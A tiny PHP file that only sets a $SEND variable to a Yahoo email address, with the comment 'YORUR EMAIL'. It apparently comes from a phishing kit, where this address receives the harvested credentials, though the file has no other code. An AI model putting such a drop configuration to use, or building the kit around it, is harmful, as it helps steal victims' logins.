<?php

$SEND="resultboxdon@yahoo.com"; // YORUR EMAIL


?>